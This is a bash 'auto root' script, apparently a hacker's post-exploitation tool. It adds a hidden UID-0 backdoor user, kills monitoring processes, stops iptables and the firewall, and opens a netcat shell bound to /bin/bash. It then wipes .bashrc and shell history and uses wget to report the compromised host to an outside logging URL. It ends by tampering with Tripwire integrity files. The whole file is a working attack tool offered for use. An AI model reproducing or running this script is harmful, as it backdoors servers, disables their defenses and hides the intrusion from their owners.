#!/bin/bash
# This is a auto root script, helps add users kills daemons and a few other useful things!
# Want to have the server get logged on execution? Edit the 'Logger' link!
# -- Edit? -- #
LOGGER="http://blasze.tk/EXAMPLE"

# -- Don't Touch -- #
uname=`uname -n`
twd=/var/lib/tripwire/$uname.twd
ip=`ifconfig eth0 2>/dev/null|awk '/inet addr:/ {print $2}'|sed 's/addr://'`

# -- Colors -- #
RED='\033[0;31m'
CYAN='\033[0;36m'
LG='\033[0;37m'
NO='\033[0m'
GR='\033[1;32m'

# -- Banner --#
echo '''
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ____ ____ ____ ____ ____ ____ 
||J |||I |||H |||A |||D |||I ||
||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|


Developed by: @Jihadi4Potus
Twitter: https://twitter.com/Jihadi4Potus
Website: http://leakedfiles.org
Version: v1.1 | Updated 7/13/17
[+ Syntax sh $0 [USERNAME] [PASSWORD] +]

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
'''

# -- Setting User/Pass -- #
if [ $# != 2 ]; then
    echo "${LG}[${RED}!${LG}] ${RED}Invalid Arguments.${NO}"
    exit 0
fi

# -- Checks if Root -- #
if ! [ $(id -u) = 0 ]; then
   echo "${LG}[${RED}!${LG}] ${RED}Requires Root, please try agin with root!${NO}"
   exit 1
fi
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash $1
passwd $1

# -- Stopping Security/Daemons -- #
        echo "${RED}Stopping Services ..."; 
        echo "${LG}Servce NSCD ${GR}Stopped!${NO}" && killall -9 -q nscd >/dev/null 2>&1 || echo "${LG}Servce NSCD ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce XNTPS ${GR}Stopped!${NO}" && killall -9 -q xntps >/dev/null 2>&1 || echo "${LG}Servce XNTPS ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce MOUNTD ${GR}Stopped!${NO}" && killall -9 -q mountd >/dev/null 2>&1 || echo "${LG}Servce MOUNTD ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce mserv ${GR}Stopped!${NO}" && killall -9 -q mserv >/dev/null 2>&1 || echo "${LG}Servce mserv ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce psybnc ${GR}Stopped!${NO}" && killall -9 -q psybnc >/dev/null 2>&1 || echo "${LG}Servce psybnc ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce t0rns ${GR}Stopped!${NO}" && killall -9 -q t0rns >/dev/null 2>&1 || echo "${LG}Servce t0rns ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce linsniffer ${GR}Stopped!${NO}" && killall -9 -q linsniffer >/dev/null 2>&1 || echo "${LG}Servce linsniffer ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce sniffer ${GR}Stopped!${NO}" && killall -9 -q sniffer >/dev/null 2>&1 || echo "${LG}Servce sniffer ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce lpsched ${GR}Stopped!${NO}" && killall -9 -q lpsched >/dev/null 2>&1 || echo "${LG}Servce lpsched ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce sniff ${GR}Stopped!${NO}" && killall -9 -q sniff >/dev/null 2>&1 || echo "${LG}Servce sniff ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce sn1f ${GR}Stopped!${NO}" && killall -9 -q sn1f >/dev/null 2>&1 || echo "${LG}Servce snif ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce xsf ${GR}Stopped!${NO}" && killall -9 -q xsf >/dev/null 2>&1 || echo "${LG}Servce xsf ${RED}Failed!${NO}"; sleep 1
        echo "${LG}Servce xchk ${GR}Stopped!${NO}" && killall -9 -q xchk >/dev/null 2>&1  || echo "${LG}Servce xchk ${RED}Failed!${NO}"; sleep 1
        serivce iptables stop 
        service fw stop

# -- Create Reverse Shell w/ Netcat -- #
while true; do
    read -p "Want to open a reverse shell? [Y/n] " answer2
    read -p "Please enter your disired port: ~# " port
    case $answer2 in
        [Yy]* ) yum install screen nc -y >/dev/null 2>&1 || apt-get install screen netcat -y >/dev/null 2>&1; screen -dmSL asdf nc -lvp $port -c /bin/bash >/dev/null 2>&1 || screen -dmSL asdf nc -lvp $port} -e /bin/bash >/dev/null 2>&1; sleep 1; echo "${GR}Success! ${LG}Active Shell on: ${NO}[${RED}${ip}:$port${NO}]"; rm -fr ~/.bashrc >/dev/null 2>&1; history -c >/dev/null 2>&1; wget -q -O /tmp/... ${LOGGER}; break;;
        [Nn]* ) echo "${LG}[${RED}!${LG}] ${RED}Exiting${NO}"; break;;
        * ) echo "${LG}[${RED}!${LG}] ${RED}Invalid Arguments.${NO}";;
    esac
done
sleep 2

# -- Detecting/Killing Tripwire -- #
echo "${CYAN}*/ ${NO}Checking for ${GR}Tripwire ${NO}Process ${CYAN}*/${NO}"
sleep 2
if [ -d /etc/tripwire ]; then
    echo "TripWire: ${GR}DETECTED"
    chattr -isa $twd
else
    echo "TripWire: ${RED}Not Available!${NO}"
   exit 1
fi